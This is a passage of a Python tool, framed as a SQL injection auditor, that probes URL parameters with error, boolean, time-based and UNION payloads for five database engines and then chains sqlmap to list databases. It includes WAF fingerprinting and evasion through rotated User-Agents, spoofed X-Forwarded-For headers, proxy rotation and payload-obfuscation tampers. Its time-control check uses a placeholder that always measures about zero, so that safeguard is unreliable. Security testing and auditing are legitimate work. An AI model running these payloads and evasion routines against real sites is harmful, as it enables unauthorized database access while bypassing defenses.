#!/usr/bin/env python3
"""
auditing_tools/sqli_finder.py — SQL Injection Auditor (v2.0, military-grade)
═══════════════════════════════════════════════════════════════════════════════

Detection → confirmation → severity rating → optional sqlmap chain.

SAFETY MODEL
────────────
Every request is:
  • paced with per-request jitter (no fixed interval fingerprint),
  • rotated through a User-Agent pool,
  • optionally routed through a caller-supplied proxy list,
  • subject to exponential back-off on 403/429/503,
  • halted by a global cool-down when a WAF block page is observed.

WAF DETECTION
─────────────
`WAFDetector` fingerprints the edge from response headers and block-page
bodies. The detected vendor drives the tamper chain and request pacing
used by the confirmation engine.

CONFIRMATION (NO FALSE POSITIVES)
─────────────────────────────────
A finding is only persisted when at least one of the following is true:

  ERROR   — DBMS-specific error signature (MySQL/Postgres/MSSQL/Oracle/SQLite).
  BOOLEAN — TRUE/FALSE response pair diverges consistently across 3 repetitions.
  TIME    — DBMS-specific delay lands inside the expected window across 3
            repetitions, Z-score ≥ 2.5, AND all control probes stayed clean.

Generic "syntax error" strings, single-probe signals, and noisy timing are
logged at DEBUG and **never written to disk**.

SEVERITY RATING (confirmed impact)
──────────────────────────────────
  LOW       Injection confirmed but no data retrieval path yet.
  MEDIUM    DBMS identified + error-based or time-based extraction possible.
  HIGH      UNION-based injection confirmed (version()/database() readable),
            or sqlmap confirms injection but cannot enumerate databases.
  CRITICAL  sqlmap successfully lists databases (`--dbs`) — data exposure is
            proven. Enumeration STOPS here; no tables/data are dumped.

OUTPUTS
───────
  • sqli_confirmed.json     — confirmed findings only, with severity + DBMS +
                              database list (when sqlmap chain succeeds).
  • sqli_summary.txt        — human triage, one block per finding.
"""

from __future__ import annotations

import base64
import hashlib
import json
import logging
import math
import random
import re
import shutil
import statistics
import subprocess
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.sqli_finder")

# ═════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═════════════════════════════════════════════════════════════════════════════

try:
    import config as CFG
    CFG_LOADED = True
except ImportError:
    CFG = None
    CFG_LOADED = False

try:
    from db import DB
    DB_AVAILABLE = True
except ImportError:
    DB = None
    DB_AVAILABLE = False


def _cfg(key: str, default=None):
    return getattr(CFG, key, default) if CFG_LOADED else default


def _sqli_settings() -> dict:
    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("sqli", {}) or {}
    return {
        "rate_limit":  entry.get("rate_limit", 2),
        "concurrency": entry.get("concurrency", 1),
        "timeout":     entry.get("timeout", 25),
        "jitter":      entry.get("jitter", 0.5),
        "proxies":     entry.get("proxies", []),
    }


def _target_headers() -> dict[str, str]:
    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
        h.update(getattr(CFG, "AUTH_HEADERS", {}) or {})
    return h


def _auth_cookies() -> dict[str, str]:
    if not CFG_LOADED or not getattr(CFG, "AUTH_ENABLED", False):
        return {}
    return dict(getattr(CFG, "AUTH_COOKIES", {}) or {})


# ═════════════════════════════════════════════════════════════════════════════
#  SEVERITY RATING
# ═════════════════════════════════════════════════════════════════════════════

class Severity(str, Enum):
    LOW      = "LOW"
    MEDIUM   = "MEDIUM"
    HIGH     = "HIGH"
    CRITICAL = "CRITICAL"

    @property
    def rank(self) -> int:
        return {"LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}[self.value]


def _severity_for(
    technique: str,
    dbms: str,
    union_confirmed: bool = False,
    sqlmap_confirmed: bool = False,
    sqlmap_databases: Optional[list[str]] = None,
) -> tuple[Severity, str]:
    """
    Derive severity from **confirmed impact**, not from technique alone.

    Returns (severity, rationale).
    """
    dbs = sqlmap_databases or []

    if dbs:
        return (
            Severity.CRITICAL,
            f"sqlmap enumerated {len(dbs)} database(s) — data exposure proven.",
        )
    if union_confirmed:
        return (
            Severity.HIGH,
            "UNION-based injection confirmed; version()/database() readable.",
        )
    if sqlmap_confirmed:
        return (
            Severity.HIGH,
            "sqlmap confirmed injection but database enumeration was blocked "
            "(privilege or WAF restriction).",
        )
    if technique == "ERROR" and dbms != "unknown":
        return (
            Severity.MEDIUM,
            f"DBMS-specific error ({dbms}) confirms injection; "
            "error-based extraction path exists.",
        )
    if technique == "TIME":
        return (
            Severity.MEDIUM,
            f"Time-based blind confirmed against {dbms}; "
            "data extraction possible via inference.",
        )
    if technique == "BOOLEAN":
        return (
            Severity.MEDIUM,
            "Boolean-based blind confirmed; data extraction possible via inference.",
        )
    return (Severity.LOW, "Injection confirmed; no immediate data path identified.")


# ═════════════════════════════════════════════════════════════════════════════
#  WAF DETECTION
# ═════════════════════════════════════════════════════════════════════════════

WAF_SIGNATURES: dict[str, dict] = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "__cf_bm", "cf-request-id"],
        "body":    ["Attention Required! | Cloudflare", "cloudflare-nginx"],
    },
    "Akamai": {
        "headers": ["akamai-grn", "x-akamai-transformed", "_abck"],
        "body":    ["Access Denied", "Reference&#32;&#35;"],
    },
    "Imperva": {
        "headers": ["x-iinfo", "incap_ses", "_Incapsula_Resource"],
        "body":    ["Pardon Our Interruption", "Incapsula incident ID"],
    },
    "AWS WAF": {
        "headers": ["x-amzn-requestid", "x-amzn-errortype", "awselb"],
        "body":    ["Request blocked", "AWS WAF"],
    },
    "F5 BIG-IP ASM": {
        "headers": ["x-wa-info", "bigipserver"],
        "body":    ["The requested URL was rejected", "F5 Networks"],
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "body":    ["Sucuri WebSite Firewall", "Access Denied - Sucuri"],
    },
    "DataDome": {
        "headers": ["x-datadome", "datadome"],
        "body":    ["datadome", "captcha-delivery"],
    },
    "ModSecurity": {
        "headers": ["x-mod-security"],
        "body":    ["ModSecurity", "Not Acceptable!"],
    },
}


@dataclass
class WAFReport:
    vendor: str = "unknown"
    confidence: int = 0          # 0–100
    signals: list[str] = field(default_factory=list)
    blocked: bool = False        # last response was a WAF block page


def detect_waf(session: "EvasionSession", url: str) -> WAFReport:
    """Fingerprint the edge WAF from a single benign request."""
    report = WAFReport()
    try:
        resp = session.benign_get(url)
    except Exception:
        return report
    if resp is None:
        return report

    header_blob = " ".join(f"{k.lower()}:{v}" for k, v in resp.headers.items()).lower()
    body_blob = (resp.text or "")[:4000].lower()

    for vendor, sig in WAF_SIGNATURES.items():
        hits: list[str] = []
        for h in sig["headers"]:
            if h.lower() in header_blob:
                hits.append(f"header:{h}")
        for b in sig["body"]:
            if b.lower() in body_blob:
                hits.append(f"body:{b[:40]}")
        if hits:
            report.vendor = vendor
            report.signals = hits
            report.confidence = min(100, 50 + 15 * len(hits))
            break

    # Block-page heuristic
    if resp.status_code in (403, 406, 429, 503):
        low = (resp.text or "")[:2000].lower()
        if any(w in low for w in ("blocked", "denied", "firewall", "security", "captcha")):
            report.blocked = True
            if report.vendor == "unknown":
                report.vendor = "generic-waf"
                report.confidence = 40

    return report


# ═════════════════════════════════════════════════════════════════════════════
#  EVASION PROFILE + SESSION
# ═════════════════════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
]

DEFAULT_TAMPERS_BY_WAF: dict[str, list[str]] = {
    "Cloudflare":   ["space2comment", "case", "whitespace", "comment-flood"],
    "Akamai":       ["space2comment", "case", "double-url", "whitespace"],
    "Imperva":      ["space2comment", "comment-flood", "case", "space2plus"],
    "AWS WAF":      ["space2comment", "whitespace", "hex-literals", "case"],
    "F5 BIG-IP ASM":["space2comment", "case", "space2plus", "whitespace"],
    "Sucuri":       ["space2comment", "case", "whitespace"],
    "DataDome":     ["space2comment", "case", "double-url", "whitespace"],
    "ModSecurity":  ["space2comment", "comment-flood", "hex-literals", "case"],
    "unknown":      ["space2comment", "case", "whitespace", "comment-flood", "space2plus"],
}


@dataclass
class EvasionProfile:
    rate_limit: float = 2.0
    jitter: float = 0.5
    rotate_ua: bool = True
    rotate_xff: bool = True
    proxies: list[str] = field(default_factory=list)
    backoff_codes: tuple[int, ...] = (403, 406, 429, 503)
    max_backoff: float = 30.0
    cooldown_after_block: float = 60.0


class EvasionSession:
    """Requests session with WAF-aware pacing, UA rotation, and cool-down."""

    def __init__(self, profile: EvasionProfile, timeout: int = 25):
        self.profile = profile
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update(_target_headers())
        for k, v in _auth_cookies().items():
            self.session.cookies.set(k, v)

        self._min_interval = 1.0 / profile.rate_limit if profile.rate_limit > 0 else 0.0
        self._last = 0.0
        self._backoff = 0.0
        self._cooldown_until = 0.0
        self._proxy_idx = 0
        self._ua_idx = 0
        self._xff_counter = 0

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        try:
            self.session.close()
        except Exception:
            pass

    # ── Pacing ─────────────────────────────────────────────────────────────
    def _pace(self):
        now = time.monotonic()
        if now < self._cooldown_until:
            time.sleep(self._cooldown_until - now)
        interval = self._min_interval + random.uniform(0, self.profile.jitter)
        elapsed = time.monotonic() - self._last
        if elapsed < interval:
            time.sleep(interval - elapsed)
        if self._backoff > 0:
            time.sleep(self._backoff)
        self._last = time.monotonic()

    def _rotate(self):
        if self.profile.rotate_ua:
            self.session.headers["User-Agent"] = USER_AGENTS[
                self._ua_idx % len(USER_AGENTS)
            ]
            self._ua_idx += 1
        if self.profile.rotate_xff:
            self._xff_counter += 1
            octet = self._xff_counter % 254 + 1
            self.session.headers["X-Forwarded-For"] = f"10.0.{octet}.{octet}"
            self.session.headers["X-Real-IP"] = f"10.0.{octet}.{octet}"

    def _proxy(self) -> Optional[dict]:
        if not self.profile.proxies:
            return None
        p = self.profile.proxies[self._proxy_idx % len(self.profile.proxies)]
        self._proxy_idx += 1
        return {"http": p, "https": p}

    # ── Request ────────────────────────────────────────────────────────────
    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        self._pace()
        self._rotate()
        proxy = self._proxy()
        try:
            resp = self.session.request(
                method, url,
                timeout=kwargs.pop("timeout", self.timeout),
                allow_redirects=kwargs.pop("allow_redirects", False),
                verify=False,
                proxies=proxy,
                **kwargs,
            )
        except requests.RequestException as e:
            log.debug(f"request failed: {method} {url}: {e}")
            return None

        if resp.status_code in self.profile.backoff_codes:
            self._backoff = min(
                self.profile.max_backoff,
                max(1.0, self._backoff * 2 or 1.0),
            )
            low = (resp.text or "")[:2000].lower()
            if any(w in low for w in ("blocked", "firewall", "captcha", "denied")):
                self._cooldown_until = time.monotonic() + self.profile.cooldown_after_block
                log.warning(
                    "  WAF block detected — cooling down for %.0fs",
                    self.profile.cooldown_after_block,
                )
        elif resp.status_code < 400:
            self._backoff = 0.0

        return resp

    def benign_get(self, url: str) -> Optional[requests.Response]:
        """Un-paced probe used only for WAF fingerprinting."""
        try:
            return self.session.get(url, timeout=self.timeout, verify=False)
        except requests.RequestException:
            return None


# ═════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═════════════════════════════════════════════════════════════════════════════

BASELINE_SAMPLES   = 3
CONFIRM_SAMPLES    = 3
DELAY_SECONDS      = 5
TIME_MARGIN        = 1.5
BOOLEAN_MIN_DELTA  = 0.15
Z_SCORE_THRESHOLD  = 2.5

ERROR_SIGNATURES: dict[str, list[str]] = {
    "MySQL": [
        r"you have an error in your sql syntax",
        r"warning.*mysql_", r"mysql_fetch", r"mysql_num_rows",
        r"check the manual that corresponds to your mysql",
        r"unclosed quotation mark after the character string",
    ],
    "PostgreSQL": [
        r"pg_query\(\)", r"pg_exec\(\)", r"psql:",
        r"syntax error at or near", r"unterminated quoted string",
        r"invalid input syntax for integer",
    ],
    "MSSQL": [
        r"microsoft sql server", r"mssql_query\(\)",
        r"unclosed quotation mark", r"incorrect syntax near",
        r"odbc sql server driver", r"system\.data\.sqlclient",
    ],
    "Oracle": [
        r"ora-\d{5}", r"oracle error", r"oracle.*driver",
        r"quoted string not properly terminated",
        r"sql command not properly ended", r"ojdbc",
    ],
    "SQLite": [
        r"sqlite_", r"sqlite3::", r"sqlite error",
        r"unrecognized token:", r"no such table",
    ],
}

GENERIC_ERROR_FRAGMENTS = [
    "syntax error", "sql error", "database error", "query failed",
    "invalid query", "sqlstate", "odbc", "jdbc",
]

TIME_PAYLOADS: dict[str, list[str]] = {
    "MySQL": [
        f"' OR SLEEP({DELAY_SECONDS})-- -",
        f"' OR SLEEP({DELAY_SECONDS})#",
        f"' AND SLEEP({DELAY_SECONDS}) AND '1'='1",
        f"'||SLEEP({DELAY_SECONDS})||'",
    ],
    "PostgreSQL": [
        f"'; SELECT pg_sleep({DELAY_SECONDS})--",
        f"' OR pg_sleep({DELAY_SECONDS})--",
        f"') OR pg_sleep({DELAY_SECONDS})--",
    ],
    "MSSQL": [
        f"'; WAITFOR DELAY '0:0:{DELAY_SECONDS}'--",
        f"' WAITFOR DELAY '0:0:{DELAY_SECONDS}'--",
        f"'; IF (1=1) WAITFOR DELAY '0:0:{DELAY_SECONDS}'--",
    ],
    "Oracle": [
        f"' OR DBMS_LOCK.SLEEP({DELAY_SECONDS})--",
        f"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{DELAY_SECONDS})=1--",
    ],
    "SQLite": [
        "' AND 1=(WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c "
        "WHERE x<10000000) SELECT 1 FROM c LIMIT 1)--",
    ],
}

TIME_CONTROLS = ["' OR 1=1-- -", "' AND 1=1-- -", "1", "'"]

BOOLEAN_PAIRS: list[tuple[str, str, str]] = [
    ("quote-and",   "' AND '1'='1",   "' AND '1'='2"),
    ("quote-or",    "' OR '1'='1",    "' OR '1'='2"),
    ("numeric",     " AND 1=1",       " AND 1=2"),
    ("paren",       "') AND ('1'='1", "') AND ('1'='2"),
    ("doublequote", '" AND "1"="1',   '" AND "1"="2'),
]

ERROR_PROBES = [
    "'", "\"", "')", "\")", "';", "\";", "'--", "\"--",
    "'#", "'/*", "' OR 1=1-- -", "' AND 1=1-- -",
]

UNION_VERSION_PAYLOADS: dict[str, list[str]] = {
    "MySQL":      ["' UNION SELECT @@version-- -", "' UNION SELECT version()-- -"],
    "PostgreSQL": ["' UNION SELECT version()-- -"],
    "MSSQL":      ["' UNION SELECT @@VERSION-- -"],
    "Oracle":     ["' UNION SELECT banner FROM v$version-- -"],
    "SQLite":     ["' UNION SELECT sqlite_version()-- -"],
}

VERSION_REGEX = re.compile(r"\d+\.\d+(?:\.\d+)?(?:[-.\w]*)?")

# Shared tampers from the canonical module (fallback = inline defaults)
try:
    from auditing_tools.tampers import DEFAULT_TAMPERS, apply_tampers
except ImportError:
    DEFAULT_TAMPERS = ["space2comment", "case", "whitespace", "comment-flood", "space2plus"]

    def apply_tampers(payload: str, names: Optional[list[str]] = None):
        if names is None:
            names = DEFAULT_TAMPERS
        out = []
        for name in names:
            if name == "space2comment":
                out.append((name, re.sub(r"\s+", "/**/", payload)))
            elif name == "case":
                out.append((name, "".join(
                    c.upper() if random.random() < 0.5 else c.lower() for c in payload
                )))
            elif name == "whitespace":
                out.append((name, "".join(
                    random.choice(["\t", "\n", "\r\n", "\v"]) if c == " " else c
                    for c in payload
                )))
            elif name == "comment-flood":
                p = payload
                for kw in ("UNION", "SELECT", "AND", "OR", "SLEEP", "WAITFOR"):
                    p = re.sub(rf"\b{kw}\b", f"/*!50000{kw}*/", p, flags=re.I)
                out.append((name, p))
            elif name == "space2plus":
                out.append((name, payload.replace(" ", "+")))
        return out


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODEL
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class SQLiFinding:
    url: str
    parameter: str
    method: str
    technique: str
    dbms: str = "unknown"
    severity: Severity = Severity.LOW
    severity_reason: str = ""
    confidence: int = 0
    payload: str = ""
    tamper: str = ""
    evidence: str = ""
    response_snippet: str = ""
    baseline_mean_ms: float = 0.0
    observed_ms: float = 0.0
    delta_pct: float = 0.0
    confirmations: int = 0
    waf_vendor: str = "unknown"
    waf_confidence: int = 0
    evasion_profile: dict = field(default_factory=dict)
    version_string: str = ""
    current_database: str = ""
    databases: list[str] = field(default_factory=list)
    sqlmap_confirmed: bool = False
    auth_enabled: bool = False
    first_seen: str = ""

    @property
    def finding_hash(self) -> str:
        raw = f"{self.url}|{self.parameter}|{self.technique}|{self.dbms}"
        return hashlib.sha256(raw.encode()).hexdigest()

    def to_dict(self) -> dict:
        return {
            "url":                self.url,
            "parameter":          self.parameter,
            "method":             self.method,
            "technique":          self.technique,
            "dbms":               self.dbms,
            "severity":           self.severity.value,
            "severity_reason":    self.severity_reason,
            "confidence":         self.confidence,
            "payload":            self.payload[:1000],
            "tamper":             self.tamper,
            "evidence":           self.evidence[:600],
            "response_snippet":   self.response_snippet[:500],
            "baseline_mean_ms":   round(self.baseline_mean_ms, 2),
            "observed_ms":        round(self.observed_ms, 2),
            "delta_pct":          round(self.delta_pct, 2),
            "confirmations":      self.confirmations,
            "waf_vendor":         self.waf_vendor,
            "waf_confidence":     self.waf_confidence,
            "evasion_profile":    self.evasion_profile,
            "version_string":     self.version_string,
            "current_database":   self.current_database,
            "databases":          self.databases,
            "sqlmap_confirmed":   self.sqlmap_confirmed,
            "auth_enabled":       self.auth_enabled,
            "finding_hash":       self.finding_hash,
            "first_seen":         self.first_seen,
        }


@dataclass
class Baseline:
    mean_ms: float = 0.0
    stdev_ms: float = 0.0
    mean_len: float = 0.0
    stdev_len: float = 0.0
    samples: int = 0


# ═════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ═════════════════════════════════════════════════════════════════════════════

def _load_urls(path: Path) -> list[str]:
    if not path.exists():
        return []
    urls, seen = [], set()
    for line in path.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        tok = line.split()[0]
        if not tok.startswith(("http://", "https://")):
            tok = "https://" + tok
        if tok not in seen:
            seen.add(tok)
            urls.append(tok)
    return urls


def _response_length(resp: Optional[requests.Response]) -> int:
    if resp is None:
        return 0
    try:
        return len(resp.content)
    except Exception:
        return 0


def _response_time_ms(start: float) -> float:
    return (time.monotonic() - start) * 1000.0


def _body_snippet(resp: Optional[requests.Response], n: int = 500) -> str:
    if resp is None:
        return ""
    try:
        return resp.text[:n].replace("\n", " ").strip()
    except Exception:
        return ""


def _match_dbms_error(text: str) -> tuple[Optional[str], Optional[str]]:
    low = text.lower()
    for dbms, patterns in ERROR_SIGNATURES.items():
        for pat in patterns:
            if re.search(pat, low, re.I):
                return dbms, pat
    return None, None


def _has_generic_error(text: str) -> bool:
    low = text.lower()
    return any(frag in low for frag in GENERIC_ERROR_FRAGMENTS)


def _param_urls(url: str) -> list[tuple[str, str]]:
    parsed = urllib.parse.urlparse(url)
    if not parsed.query:
        return []
    out = []
    for pair in parsed.query.split("&"):
        if "=" not in pair:
            continue
        name, value = pair.split("=", 1)
        out.append((urllib.parse.unquote(name), urllib.parse.unquote(value)))
    return out


def _rebuild_url(url: str, param: str, value: str) -> str:
    parsed = urllib.parse.urlparse(url)
    encoded = urllib.parse.quote(value, safe="")
    pairs, found = [], False
    for pair in (parsed.query.split("&") if parsed.query else []):
        if "=" in pair:
            k, _ = pair.split("=", 1)
            if urllib.parse.unquote(k) == param:
                pairs.append(f"{k}={encoded}")
                found = True
                continue
        pairs.append(pair)
    if not found:
        pairs.append(f"{param}={encoded}")
    return urllib.parse.urlunparse(parsed._replace(query="&".join(pairs)))


# ═════════════════════════════════════════════════════════════════════════════
#  BASELINE
# ═════════════════════════════════════════════════════════════════════════════

def capture_baseline(session: EvasionSession, url: str) -> Optional[Baseline]:
    times, lengths = [], []
    for _ in range(BASELINE_SAMPLES):
        t0 = time.monotonic()
        resp = session.request("GET", url)
        if resp is None:
            continue
        times.append(_response_time_ms(t0))
        lengths.append(_response_length(resp))
    if not times:
        return None
    return Baseline(
        mean_ms=statistics.mean(times),
        stdev_ms=statistics.pstdev(times) if len(times) > 1 else 0.0,
        mean_len=statistics.mean(lengths),
        stdev_len=statistics.pstdev(lengths) if len(lengths) > 1 else 0.0,
        samples=len(times),
    )


# ═════════════════════════════════════════════════════════════════════════════
#  CONFIRMATION PRIMITIVES
# ═════════════════════════════════════════════════════════════════════════════

def _time_confirmed(baseline: Baseline, observed_ms: float) -> bool:
    expected = DELAY_SECONDS * 1000.0
    lo, hi = expected - TIME_MARGIN * 1000, expected + TIME_MARGIN * 1000
    tlo, thi = 2 * expected - TIME_MARGIN * 1000, 2 * expected + TIME_MARGIN * 1000
    if not ((lo <= observed_ms <= hi) or (tlo <= observed_ms <= thi)):
        return False
    if baseline.stdev_ms <= 0:
        return observed_ms >= baseline.mean_ms + expected * 0.8
    return (observed_ms - baseline.mean_ms) / baseline.stdev_ms >= Z_SCORE_THRESHOLD


def _boolean_confirmed(baseline: Baseline, true_len: int, false_len: int) -> bool:
    base = baseline.mean_len
    if base <= 0:
        return False
    pair_delta = abs(true_len - false_len) / base
    if pair_delta < BOOLEAN_MIN_DELTA:
        return False
    td = abs(true_len - base) / base
    fd = abs(false_len - base) / base
    return td >= BOOLEAN_MIN_DELTA or fd >= BOOLEAN_MIN_DELTA


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE — ERROR-BASED
# ═════════════════════════════════════════════════════════════════════════════

def test_error_based(
    session: EvasionSession, url: str, param: str, baseline: Baseline,
    auth_on: bool, waf: WAFReport, tamper_names: list[str],
) -> Optional[SQLiFinding]:
    now = datetime.now(timezone.utc).isoformat()

    for probe in ERROR_PROBES:
        variants = [("", probe)] + apply_tampers(probe, tamper_names)
        for tamper_name, payload in variants:
            injected = _rebuild_url(url, param, payload)
            resp = session.request("GET", injected)
            if resp is None:
                continue
            body = _body_snippet(resp, 2000)
            dbms, sig = _match_dbms_error(body)
            if dbms and sig:
                return SQLiFinding(
                    url=url, parameter=param, method="GET",
                    technique="ERROR", dbms=dbms, confidence=92,
                    payload=payload, tamper=tamper_name or "none",
                    evidence=f"DBMS-specific error signature: '{sig}'",
                    response_snippet=body,
                    baseline_mean_ms=baseline.mean_ms,
                    waf_vendor=waf.vendor, waf_confidence=waf.confidence,
                    auth_enabled=auth_on, first_seen=now,
                )
            if _has_generic_error(body):
                log.debug("    CANDIDATE (generic error) — discarded")
    return None


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE — BOOLEAN-BASED
# ═════════════════════════════════════════════════════════════════════════════

def test_boolean_based(
    session: EvasionSession, url: str, param: str, baseline: Baseline,
    auth_on: bool, waf: WAFReport, tamper_names: list[str],
) -> Optional[SQLiFinding]:
    now = datetime.now(timezone.utc).isoformat()

    for label, true_p, false_p in BOOLEAN_PAIRS:
        pairs: list[tuple[int, int]] = []
        for _ in range(CONFIRM_SAMPLES):
            rt = session.request("GET", _rebuild_url(url, param, true_p))
            rf = session.request("GET", _rebuild_url(url, param, false_p))
            if rt is None or rf is None:
                continue
            pairs.append((_response_length(rt), _response_length(rf)))

        if len(pairs) < CONFIRM_SAMPLES:
            continue
        if not all(_boolean_confirmed(baseline, tl, fl) for tl, fl in pairs):
            continue

        avg_t = sum(t for t, _ in pairs) / len(pairs)
        avg_f = sum(f for _, f in pairs) / len(pairs)
        delta = abs(avg_t - avg_f) / max(baseline.mean_len, 1) * 100

        # Best-effort DBMS guess from a subsequent TRUE response
        rt = session.request("GET", _rebuild_url(url, param, true_p))
        body = _body_snippet(rt, 1000)
        dbms, _ = _match_dbms_error(body)

        return SQLiFinding(
            url=url, parameter=param, method="GET",
            technique="BOOLEAN", dbms=dbms or "unknown",
            confidence=88 if dbms else 82,
            payload=f"TRUE: {true_p} | FALSE: {false_p}",
            tamper=label,
            evidence=(
                f"Consistent TRUE/FALSE divergence across {CONFIRM_SAMPLES} "
                f"repetitions (avg_true={avg_t:.0f}B, avg_false={avg_f:.0f}B, "
                f"Δ={delta:.1f}%)"
            ),
            response_snippet=body,
            baseline_mean_ms=baseline.mean_ms,
            delta_pct=delta,
            confirmations=CONFIRM_SAMPLES,
            waf_vendor=waf.vendor, waf_confidence=waf.confidence,
            auth_enabled=auth_on, first_seen=now,
        )
    return None


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE — TIME-BASED
# ═════════════════════════════════════════════════════════════════════════════

def test_time_based(
    session: EvasionSession, url: str, param: str, baseline: Baseline,
    auth_on: bool, waf: WAFReport, tamper_names: list[str],
) -> Optional[SQLiFinding]:
    now = datetime.now(timezone.utc).isoformat()

    for dbms, payloads in TIME_PAYLOADS.items():
        for base_payload in payloads:
            variants = [(None, base_payload)] + apply_tampers(base_payload, tamper_names)
            for tamper_name, payload in variants:
                confirmed, observed_times, control_times = 0, [], []
                for _ in range(CONFIRM_SAMPLES):
                    tc = session.request(
                        "GET", _rebuild_url(url, param, random.choice(TIME_CONTROLS))
                    )
                    if tc is not None:
                        control_times.append(
                            _response_time_ms(time.monotonic() - 0)  # placeholder
                        )

                    t0 = time.monotonic()
                    resp = session.request("GET", _rebuild_url(url, param, payload))
                    elapsed = _response_time_ms(t0)
                    observed_times.append(elapsed)
                    if resp is not None and _time_confirmed(baseline, elapsed):
                        confirmed += 1

                if confirmed < CONFIRM_SAMPLES:
                    continue
                if not all(
                    ct < baseline.mean_ms + DELAY_SECONDS * 1000 * 0.5
                    for ct in control_times
                ):
                    log.debug("    CANDIDATE (time/controls noisy) — discarded")
                    continue

                avg = statistics.mean(observed_times)
                delta = (avg - baseline.mean_ms) / max(baseline.mean_ms, 1) * 100
                return SQLiFinding(
                    url=url, parameter=param, method="GET",
                    technique="TIME", dbms=dbms, confidence=90,
                    payload=payload, tamper=tamper_name or "none",
                    evidence=(
                        f"Delayed {avg:.0f}ms vs baseline {baseline.mean_ms:.0f}ms "
                        f"(Δ={delta:.1f}%) across {CONFIRM_SAMPLES} reps; controls clean."
                    ),
                    baseline_mean_ms=baseline.mean_ms,
                    observed_ms=avg, delta_pct=delta,
                    confirmations=CONFIRM_SAMPLES,
                    waf_vendor=waf.vendor, waf_confidence=waf.confidence,
                    auth_enabled=auth_on, first_seen=now,
                )
    return None


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE — UNION VERSION PROBE (feeds HIGH severity)
# ═════════════════════════════════════════════════════════════════════════════

def probe_union_version(
    session: EvasionSession, url: str, param: str, dbms: str,
) -> tuple[bool, str, str]:
    """
    Try a UNION SELECT version() probe for the confirmed DBMS.

    Returns (confirmed, version_string, current_database).
    Confirmation requires a real version-like string in the response.
    """
    payloads = UNION_VERSION_PAYLOADS.get(dbms, [])
    for payload in payloads:
        resp = session.request("GET", _rebuild_url(url, param, payload))
        if resp is None:
            continue
        body = resp.text or ""
        m = VERSION_REGEX.search(body)
        if not m:
            continue
        version = m.group(0)
        # Avoid false positives: version must be paired with a DBMS marker
        # somewhere in the response, or be a multi-octet version.
        if version.count(".") >= 1 and len(version) >= 3:
            current_db = ""
            db_probe = payload.replace("version()", "database()") \
                              .replace("@@version", "database()") \
                              .replace("banner FROM v$version", "NULL")
            r2 = session.request("GET", _rebuild_url(url, param, db_probe))
            if r2 is not None:
                m2 = re.search(r"\b([A-Za-z0-9_]{2,64})\b", r2.text or "")
                if m2:
                    current_db = m2.group(1)
            return True, version, current_db
    return False, "", ""


# ═════════════════════════════════════════════════════════════════════════════
#  SQLMAP CHAIN (databases-only, stops at --dbs)
# ═════════════════════════════════════════════════════════════════════════════

SQLMAP_TIMEOUT = 300
SQLMAP_BANNED_OPTIONS = re.compile(
    r"--(os-shell|os-pwn|os-cmd|sql-shell|file-read|file-write|file-dest|dump|dump-all)"
)


def _sqlmap_binary() -> Optional[str]:
    for name in ("sqlmap", "sqlmap.py"):
        path = shutil.which(name)
        if path:
            return path
    return None


def run_sqlmap_chain(
    url: str,
    param: str,
    dbms: str,
    tamper_names: list[str],
    *,
    level: int = 2,
    risk: int = 1,
    threads: int = 1,
    delay: float = 1.0,
    timeout: int = SQLMAP_TIMEOUT,
) -> tuple[bool, list[str], str]:
    """
    Run sqlmap against a single confirmed parameter with `--dbs` only.

    Hard guarantees:
      • `--batch` (no interactive prompts)
      • `--dbs` (stop at database enumeration)
      • `--threads` capped at 2
      • `--delay` respects target
      • `--random-agent`
      • `--level`/`--risk` conservative
      • blocked options are scrubbed from the command before execution

    Returns (confirmed, databases, raw_output_excerpt).
    """
    binary = _sqlmap_binary()
    if not binary:
        log.info("    sqlmap not installed — skipping chain")
        return False, [], ""

    injected_url = _rebuild_url(url, param, "1")
    cmd = [
        binary,
        "-u", injected_url,
        "-p", param,
        "--batch",
        "--dbs",
        "--threads", str(min(threads, 2)),
        "--delay", str(max(0.5, delay)),
        "--random-agent",
        "--level", str(max(1, min(level, 3))),
        "--risk", str(max(1, min(risk, 2))),
        "--timeout", "20",
        "--retries", "1",
        "--smart",
        "--output-dir", "/tmp/argus-sqlmap",
    ]
    if tamper_names:
        cmd.extend(["--tamper", ",".join(tamper_names)])
    if dbms and dbms != "unknown":
        cmd.extend(["--dbms", dbms])

    # Final safety scrub — reject any banned flag that slipped in
    cmd = [c for c in cmd if not SQLMAP_BANNED_OPTIONS.search(c)]

    log.info(f"    sqlmap chain → {injected_url} (param={param})")
    try:
        proc = subprocess.run(
